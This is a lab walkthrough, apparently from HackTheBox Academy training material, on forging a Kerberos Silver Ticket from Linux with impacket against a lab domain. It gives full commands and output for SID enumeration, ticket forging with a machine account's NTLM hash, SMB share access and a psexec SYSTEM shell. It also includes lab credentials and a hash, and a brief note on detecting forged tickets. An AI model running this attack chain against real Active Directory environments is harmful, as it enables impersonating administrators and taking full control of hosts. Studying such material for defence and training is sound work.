# Silver Ticket from Linux


## Linux 


On Linux, **impacket** can be used to craft a **Silver Ticket**. The tool [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) will retrieve the domain's, groups', and users' SID. 



Authenticate to 10.129.205.35 with user "htb-student" and password "HTB_@cademy_stdnt!"

DC01$'s NTLM hash is 542780725df68d3456a0672f59001987


## Retrieve the Domain's SID


	> lookupsid.py inlanefreight.local/htb-student@dc01.inlanefreight.local -domain-sids
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs    
		                                                                                                    
	Password:                                                                                                
	[*] Brute forcing SIDs at dc01.inlanefreight.local                                                       
	[*] StringBinding ncacn_np:dc01.inlanefreight.local[\pipe\lsarpc]                                        
	[*] Domain SID is: S-1-5-21-1870146311-1183348186-593267556                                              
	498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)                                
	500: INLANEFREIGHT\Administrator (SidTypeUser)                                                           
	501: INLANEFREIGHT\Guest (SidTypeUser)                                                                   
	502: INLANEFREIGHT\krbtgt (SidTypeUser)                                                                  
	512: INLANEFREIGHT\Domain Admins (SidTypeGroup)                                                          
	513: INLANEFREIGHT\Domain Users (SidTypeGroup)                                                           
	514: INLANEFREIGHT\Domain Guests (SidTypeGroup)                                                          
	515: INLANEFREIGHT\Domain Computers (SidTypeGroup)                                                       
	516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)                                                     
	517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)                                                        
	518: INLANEFREIGHT\Schema Admins (SidTypeGroup)                                                          
	519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup) 
	520: INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup) 
	521: INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)                                           
	522: INLANEFREIGHT\Cloneable Domain Controllers (SidTypeGroup)                                           
	525: INLANEFREIGHT\Protected Users (SidTypeGroup)                                                        
	526: INLANEFREIGHT\Key Admins (SidTypeGroup)                                                             
	527: INLANEFREIGHT\Enterprise Key Admins (SidTypeGroup)                                                  
	553: INLANEFREIGHT\RAS and IAS Servers (SidTypeAlias)                                                    
	571: INLANEFREIGHT\Allowed RODC Password Replication Group (SidTypeAlias)                                
	572: INLANEFREIGHT\Denied RODC Password Replication Group (SidTypeAlias)                                 
	1002: INLANEFREIGHT\DC01$ (SidTypeUser)             
	1103: INLANEFREIGHT\DnsAdmins (SidTypeAlias)                                                             
	1104: INLANEFREIGHT\DnsUpdateProxy (SidTypeGroup)                                                        
	1105: INLANEFREIGHT\derek.walker (SidTypeUser)                                                           
	1106: INLANEFREIGHT\carole.holmes (SidTypeUser)                                                          
	1107: INLANEFREIGHT\callum.dixon (SidTypeUser)                                                           
	1108: INLANEFREIGHT\beth.richards (SidTypeUser)                                                          
	1109: INLANEFREIGHT\amber.smith (SidTypeUser)                                                            
	1110: INLANEFREIGHT\jenna.smith (SidTypeUser)                                                            
	1111: INLANEFREIGHT\carole.rose (SidTypeUser)                                                            
	1112: INLANEFREIGHT\sqldev (SidTypeUser)            
	1113: INLANEFREIGHT\sqlprod (SidTypeUser)           
	1114: INLANEFREIGHT\sqlqa (SidTypeUser)             
	1115: INLANEFREIGHT\sql-test (SidTypeUser)          
	1116: INLANEFREIGHT\adam.jones (SidTypeUser)                                                             
	1117: INLANEFREIGHT\jacob.kelly (SidTypeUser)                                                            
	1118: INLANEFREIGHT\DMZ01$ (SidTypeUser) 
	1119: INLANEFREIGHT\SQL01$ (SidTypeUser)            
	1120: INLANEFREIGHT\WS01$ (SidTypeUser)             
	1121: INLANEFREIGHT\FILER01$ (SidTypeUser)          
	1122: INLANEFREIGHT\daniel.whitehead (SidTypeUser)                                                       
	1123: INLANEFREIGHT\annette.jackson (SidTypeUser)                                                        
	1124: INLANEFREIGHT\sandra.murphy (SidTypeUser)                                                          
	1125: INLANEFREIGHT\debra.rogers (SidTypeUser)                                                           
	1126: INLANEFREIGHT\htb-student (SidTypeUser)                                                            
	1127: INLANEFREIGHT\brian.willis (SidTypeUser)                                                           
	2103: INLANEFREIGHT\matilda.kens (SidTypeUser)
	
![lookupsids](/Ticket-Abuse/Silver-Ticket-w-Linux/images/sids.png) 
![lookupsids](/Ticket-Abuse/Silver-Ticket-w-Linux/images/sids-2.png) 
![lookupsids](/Ticket-Abuse/Silver-Ticket-w-Linux/images/sids-3.png) 


Once we have the domain's SID, we can craft a Silver Ticket using [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) 



## Create a Silver Ticket with ticketer.py 


	ticketer.py -nthash 542780725df68d3456a0672f59001987 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local -spn cifs/dc01.inlanefreight.local Administrator
		
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

	[*] Creating basic skeleton ticket and PAC Infos
	[*] Customizing ticket for inlanefreight.local/Administrator
	[*]     PAC_LOGON_INFO
	[*]     PAC_CLIENT_INFO_TYPE
	[*]     EncTicketPart
	[*]     EncTGSRepPart
	[*] Signing/Encrypting final ticket
	[*]     PAC_SERVER_CHECKSUM
	[*]     PAC_PRIVSVR_CHECKSUM
	[*]     EncTicketPart
	[*]     EncTGSRepPart
	[*] Saving ticket in Administrator.ccache



The ticket has been forged and saved in the current **Administrator.ccache** directory. We can now use this ticket by importing it in the **KRB5CCNAME** environment variable and using any impacket tool with **-k parameter**. 

	> export KRB5CCNAME=Administrator.ccache 
	

![Ticketer.py](/Ticket-Abuse/Silver-Ticket-w-Linux/images/Ticketer.png) 



## Importing the Ticket and using it 



![smbclient.py](/Ticket-Abuse/Silver-Ticket-w-Linux/images/smbclient.png) 




	smbclient.py -k -no-pass dc01.inlanefreight.local
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by TheP[11/362]
		                                                                                                    
	Type help for list of commands                                                                           
	# shares                                                                                                 
	ADMIN$                                                                                                   
	C$                                                                                                       
	IPC$                                                                                                     
	NETLOGON
	Shares
	SYSVOL                                                                                                   
	# use C$                                                                                                 
	# ls
	drw-rw-rw-          0  Fri Oct 14 10:46:09 2022 $Recycle.Bin
	drw-rw-rw-          0  Mon Apr  3 15:13:28 2023 carole.holmes
	drw-rw-rw-          0  Wed Oct  6 09:26:26 2021 Config.Msi
	drw-rw-rw-          0  Wed Oct  6 15:38:04 2021 Documents and Settings
	-rw-rw-rw-         37  Mon Apr  3 15:12:37 2023 flag.txt
	-rw-rw-rw-  738197504  Mon Jan 15 10:20:11 2024 pagefile.sys
	drw-rw-rw-          0  Fri Feb 25 10:20:53 2022 PerfLogs
	drw-rw-rw-          0  Wed Oct  6 15:50:50 2021 Program Files
	drw-rw-rw-          0  Wed Oct  6 16:36:06 2021 Program Files (x86)
	drw-rw-rw-          0  Fri Oct 14 10:46:03 2022 ProgramData
	drw-rw-rw-          0  Fri Oct 14 06:43:03 2022 Recovery
	drw-rw-rw-          0  Thu Mar 30 11:11:55 2023 Shares



And since the SPN is in clear text and can be modified on the fly, impacket can do it for us and get us a remote shell on the compromised system. 



## Using PSExec to get a Remote Shell 


	> psexec.py -k -no-pass dc01.inlanefreight.local
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs

	[*] Requesting shares on dc01.inlanefreight.local.....
	[*] Found writable share ADMIN$
	[*] Uploading file yzDkorck.exe
	[*] Opening SVCManager on dc01.inlanefreight.local.....
	[*] Creating service ocYS on dc01.inlanefreight.local.....
	[*] Starting service ocYS.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 10.0.17763.2628]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\Windows\system32> whoami
	nt authority\system

	C:\Windows\system32> 


![psexec.py](/Ticket-Abuse/Silver-Ticket-w-Linux/images/psexec.png) 



## Detection


Silver Tickets are more limited when compared to Golden Tickets because their scope is only for the service that is being targeted on a specific host. However, they can be utilized to remain stealthier. Silver Tickets can be used for persistence when used to access computer-hosted services. Since computer account password rotation may be disabled, and AD does not prevent computer accounts from accessing resources, this type of Silver Ticket could likely be used for a very long time.

Silver Tickets forged with Mimikatz can be detected in a few ways.

1. **The account DOMAIN field is blank**. 
2. **The account DOMAIN field contains DOMAIN FQDN instead of just domain**. 


